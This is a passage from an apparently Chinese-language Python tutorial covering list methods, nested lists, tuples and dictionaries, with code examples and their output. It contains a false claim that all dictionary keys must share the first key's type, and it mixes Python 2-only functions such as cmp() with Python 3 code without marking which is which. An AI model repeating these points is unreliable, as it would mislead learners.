<li><font color="#FF7F00">insert(X, “String”)：</font> 将元素String插入到索引为X的位置，原来元素从索引为X往后移；</li>
<li><font color="#FF7F00">del list[X]：</font> 删除列表list索引为X的元素；</li>
<li><font color="#FF7F00">len(list)：</font> 是个函数，统计列表list元素的个数，和在字符串中使用一样；</li>
<li>del和pop()的区别在于：del删除的元素不可以再继续使用了，但是pop()有个返回值，因为当作栈使用，它删除的元素还可以在其他地方继续使用；</li>
<li><font color="#FF7F00">reverse() ：</font> 按元素顺序倒转；</li>
<li><font color="#FF7F00">sort() ：</font> 是方法，对列表进行永久性排序，前提是列表中所有元素数据类型一样；</li>
<li><font color="#FF7F00">sorted() ：</font> 注意这是个函数，对列表进行临时排序，若列表中所有元素数据类型不一样会报错；</li>
</ol>
<blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>2. 按值来使用的方法</strong></font></p>
</blockquote>
<ol>
<li><font color="#FF7F00">**remove(“String”)**：</font> 删除列表中值为String的元素。注意：方法remove() 只删除第一个指定的值。如果要删除的值可能在列表中出现多次，就需要使用循环来判断是否删除了所有这样的值。</li>
</ol>
<br>

<p>下面示例代码（注意“&#x2F;&#x2F;”不代表注释，仅仅为了展示）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line">list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> ]</span><br><span class="line"></span><br><span class="line">list1.append(<span class="string">&#x27;Adam&#x27;</span>)      //append()</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"></span><br><span class="line">a = list2.pop(<span class="number">3</span>)          //pop()</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> list2[<span class="number">4</span>]              //<span class="keyword">del</span></span><br><span class="line"><span class="built_in">print</span>(list2)</span><br><span class="line"></span><br><span class="line">list2.insert(<span class="number">3</span>,<span class="number">9</span>)         //insert()</span><br><span class="line"><span class="built_in">print</span>(list2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(list2))         //<span class="built_in">len</span>()</span><br><span class="line"></span><br><span class="line">list1.remove(<span class="number">1997</span>)        //remove</span><br><span class="line">list1.remove(<span class="string">&quot;Adam&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>, <span class="string">&#x27;Adam&#x27;</span>] </span><br><span class="line"><span class="number">4</span> </span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>] </span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">7</span>] </span><br><span class="line"><span class="number">6</span> </span><br><span class="line">[<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">2000</span>] </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = [<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;php&#x27;</span>]</span><br><span class="line">s = [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;scheme&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)                        //临时排序</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(s))</span><br><span class="line"><span class="built_in">print</span>(s);<span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s.sort();<span class="built_in">print</span>(s);<span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)   //永久排序 </span><br><span class="line"></span><br><span class="line">s.reverse();<span class="built_in">print</span>(s)            //倒序</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;scheme&#x27;</span>] </span><br><span class="line">[<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;scheme&#x27;</span>] </span><br><span class="line">[<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;scheme&#x27;</span>] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;scheme&#x27;</span>] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;scheme&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>] </span><br></pre></td></tr></table></figure>


<br>

<br>

<h4 id="3-2-嵌套使用列表"><a href="#3-2-嵌套使用列表" class="headerlink" title="3.2 嵌套使用列表"></a><font color="#3CB371" face="Comic sans MS">3.2 嵌套使用列表</font></h4><br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, [<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;php&#x27;</span>], <span class="string">&#x27;scheme&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">4</span> </span><br></pre></td></tr></table></figure>

<br>

<p>要注意s只有4个元素，其中s[2]又是一个list，如果拆开写就更容易理解了。<br>要拿到’php’可以写p[1]或者s[2][1]，因此s可以看成是一个二维数组，类似的还有三维、四维……数组，不过很少用到。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = [<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;php&#x27;</span>]</span><br><span class="line">s = [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, p, <span class="string">&#x27;scheme&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(p[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">2</span>][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, [<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;php&#x27;</span>], <span class="string">&#x27;scheme&#x27;</span>] </span><br><span class="line">php </span><br><span class="line">php </span><br></pre></td></tr></table></figure>



<br>

<br>

<h3 id="四-列表常用的方法和函数"><a href="#四-列表常用的方法和函数" class="headerlink" title="四. 列表常用的方法和函数"></a><font color="#FF6347" face="Comic sans MS">四. 列表常用的方法和函数</font></h3><h4 id="4-1-列表操作符"><a href="#4-1-列表操作符" class="headerlink" title="4.1 列表操作符"></a><font color="#3CB371" face="Comic sans MS">4.1 列表操作符</font></h4><p>列表对 + 和 * 的操作符与字符串相似。+ 号用于组合列表，* 号用于重复列表。<br>如下所示：</p>
<table>
<thead>
<tr>
<th align="left">Python表达式</th>
<th align="left">结果</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">len([1, 2, 3])</td>
<td align="left">3</td>
<td align="left">长度</td>
</tr>
<tr>
<td align="left">[1, 2, 3] + [4, 5, 6]</td>
<td align="left">[1, 2, 3, 4, 5, 6]</td>
<td align="left">组合</td>
</tr>
<tr>
<td align="left">[‘Hi!’] * 4</td>
<td align="left">[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]</td>
<td align="left">重复</td>
</tr>
<tr>
<td align="left">3 in [1, 2, 3]</td>
<td align="left">True</td>
<td align="left">元素是否存在于列表中</td>
</tr>
<tr>
<td align="left">for x in [1, 2, 3]: print x,</td>
<td align="left">1 2 3</td>
<td align="left">迭代</td>
</tr>
</tbody></table>
<br>

<br>

<h4 id="4-2-列表函数-amp-方法"><a href="#4-2-列表函数-amp-方法" class="headerlink" title="4.2 列表函数&amp;方法"></a><font color="#3CB371" face="Comic sans MS">4.2 列表函数&amp;方法</font></h4><p>可查阅：<font color="#00B2EE">[<a href="http://www.runoob.com/python/python-lists.html">Python列表函数&amp;方法</a>]</font></p>
<p>列表中Python包含以下函数:</p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="left">函数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="left">cmp(list1, list2)<br>比较两个列表的元素</td>
</tr>
<tr>
<td align="center">2</td>
<td align="left">len(list)<br>列表元素个数</td>
</tr>
<tr>
<td align="center">3</td>
<td align="left">max(list)<br>返回列表元素最大值</td>
</tr>
<tr>
<td align="center">4</td>
<td align="left">min(list)<br>返回列表元素最小值</td>
</tr>
<tr>
<td align="center">5</td>
<td align="left">list(seq)<br>将元组转换为列表</td>
</tr>
</tbody></table>
<br>

<p>Python包含以下方法:</p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="left">方法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="left">list.append(obj)<br>在列表末尾添加新的对象</td>
</tr>
<tr>
<td align="center">2</td>
<td align="left">list.count(obj)<br>统计某个元素在列表中出现的次数</td>
</tr>
<tr>
<td align="center">3</td>
<td align="left">list.extend(seq)<br>在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</td>
</tr>
<tr>
<td align="center">4</td>
<td align="left">list.index(obj)<br>从列表中找出某个值第一个匹配项的索引位置</td>
</tr>
<tr>
<td align="center">5</td>
<td align="left">list.insert(index, obj)<br>将对象插入列表</td>
</tr>
<tr>
<td align="center">6</td>
<td align="left">list.pop([index&#x3D;-1])<br>移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</td>
</tr>
<tr>
<td align="center">7</td>
<td align="left">list.remove(obj)<br>移除列表中某个值的第一个匹配项</td>
</tr>
<tr>
<td align="center">8</td>
<td align="left">list.reverse()<br>反向列表中元素</td>
</tr>
<tr>
<td align="center">9</td>
<td align="left">list.sort(cmp&#x3D;None, key&#x3D;None, reverse&#x3D;False)<br>对原列表进行排序</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="五-元组"><a href="#五-元组" class="headerlink" title="五. 元组"></a><font color="#FF6347" face="Comic sans MS">五. 元组</font></h3><blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>什么是元组tuple：</strong></font></p>
</blockquote>
<ol>
<li>Python的元组与列表类似，不同之处在于元组的元素不能修改。</li>
<li>元组使用小括号<code>()</code>，列表使用方括号<code>[]</code>。</li>
<li>元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可。</li>
<li>当括号中只有一个数字没有逗号时，既表示一个数字也可以便是一个元组，又可以表示数学公式中的小括号，这就产生了歧义。这种情况下，按小括号进行计算，计算结果自然是1。所以，只有1个元素的tuple定义时<font color="#FF7F00"><strong>必须加一个逗号</strong></font>。</li>
</ol>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>一、定义元组</strong></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tup1 = (<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">tup2 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> )</span><br><span class="line">tup3 = <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span></span><br></pre></td></tr></table></figure>

<br>

<p>创建空元组：<code>tup1 = ()</code></p>
<p>元组中只包含一个元素时，需要在元素后面添加逗号。<code>tup1 = (50,)</code></p>
<p>元组与字符串类似，下标索引从0开始，可以进行截取，组合等。</p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、使用元组</strong></font></p>
<ol>
<li>元组可以使用下标索引来访问元组中的值，如下：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line">tup1 = (<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">tup2 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> )</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;tup1[0]: &quot;</span>, tup1[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;tup2[1:5]: &quot;</span>, tup2[<span class="number">1</span>:<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line"></span><br><span class="line">tup1[<span class="number">0</span>]:  physics</span><br><span class="line">tup2[<span class="number">1</span>:<span class="number">5</span>]:  (<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>元组的值不允许修改，但是可以进行运算，比如连接用加号（+），重复用星号（*）。</p>
</li>
<li><p>元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line">tup = (<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> tup</span><br><span class="line"><span class="keyword">del</span> tup</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;After deleting tup : &quot;</span></span><br><span class="line"><span class="built_in">print</span> tup</span><br></pre></td></tr></table></figure>

<p>以上实例元组被删除后，输出变量会有异常信息，输出如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">After deleting tup :</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;test.py&quot;</span>, line <span class="number">9</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">print</span> tup</span><br><span class="line">NameError: name <span class="string">&#x27;tup&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure>

<br>

<ol start="4">
<li><font color="#FF7F00"><strong>最后来看一个“可变的”tuple：</strong></font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>])</span><br><span class="line">t[<span class="number">2</span>][<span class="number">0</span>] = <span class="string">&#x27;X&#x27;</span></span><br><span class="line">t[<span class="number">2</span>][<span class="number">1</span>] = <span class="string">&#x27;Y&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, [<span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>]) </span><br></pre></td></tr></table></figure>

<p>这个tuple定义的时候有3个元素，分别是’a’，’b’和一个list。不是说tuple一旦定义后就不可变了吗？怎么后来又变了？<br>别急，我们先看看定义的时候tuple包含的3个元素：</p>
<p><img data-src="https://i.loli.net/2019/02/28/5c77b1cc56635.png" alt="0.png"></p>
<p>当我们把list的元素’A’和’B’修改为’X’和’Y’后，tuple变为：</p>
<p><img data-src="https://i.loli.net/2019/02/28/5c77b1f4c3628.png" alt="0 (1).png"></p>
<br>

<p>表面上看，tuple的元素确实变了，但其实变的不是tuple的元素，而是list的元素。tuple一开始指向的list并没有改成别的list，所以，tuple所谓的“不变”是说，tuple的每个元素，指向永远不变。即指向’a’，就不能改成指向’b’，指向一个list，就不能改成指向其他对象，但指向的这个list本身是可变的！</p>
<p>理解了“指向不变”后，要创建一个内容也不变的tuple怎么做？那就必须保证tuple的每一个元素本身也不能变。</p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>三、元组运算符</strong></font></p>
<p>与字符串一样，元组之间可以使用 + 号和 * 号进行运算。这就意味着他们可以组合和复制，运算后会生成一个新的元组。</p>
<table>
<thead>
<tr>
<th align="left">Python表达式</th>
<th align="left">结果</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">len((1, 2, 3))</td>
<td align="left">3</td>
<td align="left">计算元素个数</td>
</tr>
<tr>
<td align="left">(1, 2, 3) + (4, 5, 6)</td>
<td align="left">(1, 2, 3, 4, 5, 6)</td>
<td align="left">连接</td>
</tr>
<tr>
<td align="left">(‘Hi!’,) * 4</td>
<td align="left">(‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’)</td>
<td align="left">复制</td>
</tr>
<tr>
<td align="left">3 in (1, 2, 3)</td>
<td align="left">True</td>
<td align="left">元素是否存在</td>
</tr>
<tr>
<td align="left">for x in (1, 2, 3): print x,</td>
<td align="left">1 2 3</td>
<td align="left">迭代</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>四、元组内置函数</strong></font></p>
<p>Python元组包含了以下内置函数</p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="left">函数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="left">cmp(tuple1, tuple2)<br>比较两个元组元素。</td>
</tr>
<tr>
<td align="center">2</td>
<td align="left">len(tuple)<br>计算元组元素个数。</td>
</tr>
<tr>
<td align="center">3</td>
<td align="left">max(tuple)<br>返回元组中元素最大值。</td>
</tr>
<tr>
<td align="center">4</td>
<td align="left">min(tuple)<br>返回元组中元素最小值。</td>
</tr>
<tr>
<td align="center">5</td>
<td align="left">tuple(seq)<br>将列表转换为元组。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="六-字典"><a href="#六-字典" class="headerlink" title="六. 字典"></a><font color="#FF6347" face="Comic sans MS">六. 字典</font></h3><h4 id="6-1-字典的定义"><a href="#6-1-字典的定义" class="headerlink" title="6.1 字典的定义"></a><font color="#3CB371" face="Comic sans MS">6.1 字典的定义</font></h4><blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>关于字典dict：</strong></font></p>
</blockquote>
<ol>
<li>字典是另一种可变容器模型，且可存储任意类型对象；</li>
<li>字典的每个键值 key&#x3D;&gt;value 对用冒号 : 分割，每个键值对之间用逗号 , 分割，整个字典包括在花括号 {} 中；<code>d = &#123;key1 : value1, key2 : value2 &#125;</code></li>
<li>键一般是唯一的，如果重复最后的一个键值对会替换前面的，值不需要唯一；</li>
<li>值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组；</li>
<li>第一个键定义为什么数据类型，后面所有的键必须定义为相同的数据类型；</li>
<li>访问字典里的值，把相应的键放入熟悉的方括弧即可，<code>dict[key]</code></li>
</ol>
<br>

<h4 id="6-2-字典的修改"><a href="#6-2-字典的修改" class="headerlink" title="6.2 字典的修改"></a><font color="#3CB371" face="Comic sans MS">6.2 字典的修改</font></h4><p>向字典添加新内容的方法是增加新的键&#x2F;值对，修改或删除已有键&#x2F;值对</p>
<p><font color="#00B2EE" face="Comic sans MS"><strong>一、添加键—值对、修改字典</strong></font><br><br></p>
<p><font color="#FF7F00"><strong>字典是一种动态结构，可随时在其中添加键—值对</strong></font>。要添加键—值对，可依次指定字典名、用方括号括起的键和相关联的值。</p>
<p>如下示例，我们先建立一个空字典，然后向里面添加元素（键值对）并修改：<br><font color="#FF7F00"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=&#123;&#125;</span><br><span class="line">a[<span class="string">&#x27;color&#x27;</span>]=<span class="string">&#x27;green&#x27;</span></span><br><span class="line">a[<span class="string">&#x27;points&#x27;</span>]=<span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(a[<span class="string">&#x27;color&#x27;</span>],a[<span class="string">&#x27;points&#x27;</span>])</span><br><span class="line"></span><br><span class="line">a[<span class="string">&#x27;color&#x27;</span>]=<span class="number">666</span></span><br><span class="line"><span class="built_in">print</span>(a[<span class="string">&#x27;color&#x27;</span>],a[<span class="string">&#x27;points&#x27;</span>])</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">green <span class="number">5</span></span><br><span class="line"><span class="number">666</span> <span class="number">5</span></span><br></pre></td></tr></table></figure>


<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、删除键—值对</strong></font></p>
<p>能删单一的元素也能清空字典，清空只需一项操作。</p>
<blockquote>
<p><font color="#FF7F00"><strong>删除字典可以使用del或者pop()。</strong></font></p>
</blockquote>
<ol>
<li><font color="#FF7F00"><strong>要删除一个key:</strong></font><ol>
<li>用pop(key)方法，对应的value也会从dict中删除</li>
<li>可使用del 语句将相应的键—值对彻底删除。使用del 语句时，必须指定字典名和要删除的键。<code>del dict[&#39;key&#39;]</code></li>
</ol>
</li>
<li><font color="#FF7F00"><strong>删除整个字典：</strong></font>del dict 则dict这个字典被删除了</li>
</ol>
<br>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="string">&#x27;Name&#x27;</span>: <span class="string">&#x27;Zara&#x27;</span>, <span class="string">&#x27;Age&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;Class&#x27;</span>: <span class="string">&#x27;First&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">del</span> <span class="built_in">dict</span>[<span class="string">&#x27;Name&#x27;</span>]  <span class="comment"># 删除键是&#x27;Name&#x27;的条目</span></span><br><span class="line"><span class="built_in">dict</span>.pop(<span class="string">&#x27;Class&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dict</span>[<span class="string">&#x27;Age&#x27;</span>])</span><br><span class="line"><span class="built_in">dict</span>.clear()      <span class="comment"># 清空词典所有条目</span></span><br><span class="line"><span class="keyword">del</span> <span class="built_in">dict</span>          <span class="comment"># 删除词典</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dict</span>[<span class="string">&#x27;Age&#x27;</span>])</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">7</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;1.py&quot;</span>, line <span class="number">11</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">dict</span>[<span class="string">&#x27;Age&#x27;</span>])</span><br><span class="line">TypeError: <span class="string">&#x27;type&#x27;</span> <span class="built_in">object</span> <span class="keyword">is</span> <span class="keyword">not</span> subscriptable</span><br></pre></td></tr></table></figure>


<br>

<h4 id="6-3-字典的遍历"><a href="#6-3-字典的遍历" class="headerlink" title="6.3 字典的遍历"></a><font color="#3CB371" face="Comic sans MS">6.3 字典的遍历</font></h4><p><font color="#00B2EE" face="Comic sans MS"><strong>一、判断字典中</strong><font color="red"><strong>某个键</strong></font><strong>是否存在</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>方法：</strong></font></p>
</blockquote>
<ol>
<li>通过in判断key是否存在；</li>
<li>通过dict提供的get()方法，如果key不存在，可以返回None，或者返回自己指定的value。</li>
</ol>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="string">&#x27;Name&#x27;</span>: <span class="string">&#x27;Zara&#x27;</span>, <span class="string">&#x27;Age&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;Class&#x27;</span>: <span class="string">&#x27;First&#x27;</span>&#125;</span><br><span class="line">a = <span class="string">&#x27;Name&#x27;</span> <span class="keyword">in</span> <span class="built_in">dict</span></span><br><span class="line">b = <span class="string">&#x27;Year&#x27;</span> <span class="keyword">in</span> <span class="built_in">dict</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">dict</span>.get(<span class="string">&#x27;Name&#x27;</span>,<span class="string">&#x27;如果不存在，这里是返回信息&#x27;</span>)</span><br><span class="line">d = <span class="built_in">dict</span>.get(<span class="string">&#x27;Year&#x27;</span>,<span class="string">&#x27;如果不存在，这里是返回信息&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line">Zara</span><br><span class="line">如果不存在，这里是返回信息</span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、遍历字典中的所有键</strong></font></p>
<p>在不需要使用字典中的值时，方法keys() 很有用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = &#123;</span><br><span class="line">      <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">      &#125;  </span><br><span class="line">	  </span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> f.keys():</span><br><span class="line">      <span class="built_in">print</span>(name.title())</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Jen</span><br><span class="line">Sarah</span><br><span class="line">Edward</span><br><span class="line">Phil</span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>三、遍历字典中的所有值</strong></font></p>
<p>如果你感兴趣的主要是字典包含的值，可使用方法values() ，它返回一个值列表，而不包含任何键。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> g <span class="keyword">in</span> f.values():</span><br><span class="line">    <span class="built_in">print</span>(g.title())</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Python</span><br><span class="line">C</span><br><span class="line">Ruby</span><br><span class="line">Python</span><br></pre></td></tr></table></figure>

<br>

<h4 id="6-4-字典的各种嵌套"><a href="#6-4-字典的各种嵌套" class="headerlink" title="6.4 字典的各种嵌套"></a><font color="#3CB371" face="Comic sans MS">6.4 字典的各种嵌套</font></h4><p>请自行查阅Python编程：从入门到实践 6.4</p>
<br>

<h4 id="6-5-字典内置函数-amp-方法"><a href="#6-5-字典内置函数-amp-方法" class="headerlink" title="6.5 字典内置函数&amp;方法"></a><font color="#3CB371" face="Comic sans MS">6.5 字典内置函数&amp;方法</font></h4><p>可查阅：<font color="#00B2EE">[<a href="http://www.runoob.com/python/python-dictionary.html">Python字典函数&amp;方法</a>]</font></p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>一、Python字典包含了以下内置函数：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="left">函数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="left">cmp(dict1, dict2)<br>比较两个字典元素。</td>
</tr>
<tr>
<td align="center">2</td>
<td align="left">len(dict)<br>计算字典元素个数，即键的总数。</td>
</tr>
<tr>
<td align="center">3</td>
<td align="left">str(dict)<br>输出字典可打印的字符串表示。</td>
</tr>
<tr>
<td align="center">4</td>
<td align="left">type(variable)<br>返回输入的变量类型，如果变量是字典就返回字典类型。</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、Python字典包含了以下内置方法：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="left">方法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="left">dict.clear()<br>删除字典内所有元素</td>
</tr>
<tr>
<td align="center">2</td>
<td align="left">dict.copy()<br>返回一个字典的浅复制</td>
</tr>
<tr>
<td align="center">3</td>
<td align="left">dict.fromkeys(seq[, val])<br>创建一个新字典，以序列 seq 中元素做字典的键，val 为字典所有键对应的初始值</td>
</tr>
<tr>
<td align="center">4</td>
<td align="left">dict.get(key, default&#x3D;None)<br>返回指定键的值，如果值不在字典中返回default值</td>
</tr>
<tr>
<td align="center">5</td>
